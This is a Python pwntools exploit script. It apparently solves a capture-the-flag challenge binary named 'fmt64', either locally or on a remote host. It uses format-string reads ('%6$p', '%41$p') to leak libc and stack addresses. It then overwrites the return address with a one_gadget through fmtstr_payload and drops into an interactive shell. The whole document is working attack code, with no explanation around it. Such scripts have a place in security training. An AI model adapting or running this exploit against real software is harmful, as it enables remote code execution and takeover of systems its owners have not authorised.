#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./fmt64')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    libc_one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
else:
    p = remote('47.106.94.13', 50010)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    libc_one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
elf = ELF('./fmt64', checksec=False)


def fmtstr_payload64(offset, destin, source):
    payload1, payload2 = [], []
    addr = [[ord(v), i] for i, v in enumerate(p64(source)[:-2])]
    addr = sorted(addr)
    chr_cnt = 0
    for index, value in enumerate(addr):
        payload1.append('%{:02}c%{}$hhn'.format(value[0]-chr_cnt, offset+9+index))
        payload2.append(destin+value[1])
        chr_cnt = value[0]
    return flat(payload1 + ['_' * 6] + payload2)


def payload(addr_input, value):
    pd = fmtstr_payload(7, {addr_input: value})
    p.send(pd)
    p.recv()
    sleep(1)


p.sendafter("This's my mind!\n", '%6$p')
addr__IO_2_1_stdout_ = int(p.recv(14), 16)
libcbase = addr__IO_2_1_stdout_ - libc.sym['_IO_2_1_stdout_']
addr_one_gadget = libcbase + libc_one_gadget[3]
sleep(1)

p.send('%41$p')
addr_stack_ret = int(p.recv(14), 16) - 0x138
sleep(1)

# gdb.attach(p, "b *$rebase(0xA02)\nc\nsi" + "\nni" * 10)
payload(addr_stack_ret, addr_one_gadget)

p.interactive()